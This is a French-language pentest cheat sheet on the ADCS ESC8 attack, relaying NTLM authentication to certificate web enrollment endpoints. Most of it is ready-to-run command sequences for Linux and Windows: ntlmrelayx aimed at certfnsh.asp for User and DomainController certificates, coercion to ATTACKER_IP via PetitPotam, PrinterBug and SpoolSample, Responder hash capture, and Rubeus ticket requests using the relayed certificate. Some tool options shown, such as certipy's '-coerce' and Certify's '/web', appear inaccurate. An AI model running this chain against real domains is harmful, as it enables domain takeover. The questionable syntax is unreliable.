### Description

ESC8 exploite des endpoints web HTTP de l'autorité de certification (comme les pages d'enrollment web ou les interfaces ADCS) qui utilisent une authentification NTLM, permettant des attaques de relay NTLM pour obtenir des certificats au nom d'autres utilisateurs, notamment en combinaison avec des techniques de coercition.

### Conditions vulnérables

Une CA est vulnérable à ESC8 si :

1. **Endpoints HTTP disponibles** - Services web ADCS exposés (IIS avec enrollment web)
2. **Authentification NTLM** - Les endpoints utilisent l'authentification NTLM au lieu de Kerberos
3. **Templates d'authentification** - Des modèles permettant l'authentification client sont disponibles
4. **Pas de protection EPA/Channel Binding** - Absence de Extended Protection for Authentication

---

### Exploitation depuis linux (certipy + impacket)

Enumération des endpoints web ADCS :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération spécifique des endpoints web
certipy find -u user@domain.local -p password -target dc01.domain.local -web -vulnerable

# Recherche manuelle des endpoints
nmap -p 80,443,8080 --script http-enum dc01.domain.local
curl -k https://dc01.domain.local/certsrv/ -I
```

Mise en place du serveur de relay :

```bash
# Démarrage d'un serveur de relay NTLM ciblant l'endpoint ADCS
impacket-ntlmrelayx -t https://dc01.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template User

# Avec un template spécifique
impacket-ntlmrelayx -t https://dc01.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Coercition d'authentification :

```bash
# Coercition via PetitPotam
python3 PetitPotam.py -u user -p password ATTACKER_IP dc01.domain.local

# Coercition via PrinterBug
python3 printerbug.py domain.local/user:password@dc01.domain.local ATTACKER_IP

# Coercition via PrivExchange
python3 privexchange.py -u user -p password -t https://dc01.domain.local/certsrv/certfnsh.asp exchange.domain.local
```

Exploitation avec certipy directement :

```bash
# Utilisation de certipy pour l'attaque relay complète
certipy relay -ca http://dc01.domain.local/certsrv/certfnsh.asp -template User -target dc01.domain.local

# Avec coercition intégrée
certipy relay -ca http://dc01.domain.local/certsrv/certfnsh.asp -template DomainController -target dc01.domain.local -coerce
```

---

### Exploitation depuis windows (responder + relay tools)

Enumération des endpoints web ADCS :

```powershell
# Énumération des services web ADCS
Certify.exe find /vulnerable | findstr "Web Endpoints"

# Test manuel des endpoints
Invoke-WebRequest -Uri "https://dc01.domain.local/certsrv/" -UseDefaultCredentials
Test-NetConnection -ComputerName dc01.domain.local -Port 80,443
```

Configuration du relay avec Responder :

```bash
# Démarrage de Responder pour capturer les hashs
responder -I eth0 -w -f

# Dans un autre terminal, relay vers ADCS
impacket-ntlmrelayx -t https://dc01.domain.local/certsrv/certfnsh.asp --adcs --template User -smb2support
```

Coercition depuis Windows :

```powershell
# Utilisation de SpoolSample pour coercition
SpoolSample.exe dc01.domain.local ATTACKER_IP

# Utilisation de PetitPotam
PetitPotam.exe ATTACKER_IP dc01.domain.local

# Coercition via RPC calls
Invoke-SpoolerService -ComputerName dc01.domain.local -CaptureServer ATTACKER_IP
```

Exploitation avec des outils .NET :

```powershell
# Utilisation de Certify pour exploitation directe si possible
Certify.exe request /ca:dc01.domain.local\CA-Name /template:User /web

# Combination avec Rubeus pour l'authentification finale
Rubeus.exe asktgt /user:victim /certificate:relayed_cert.pfx /ptt
```
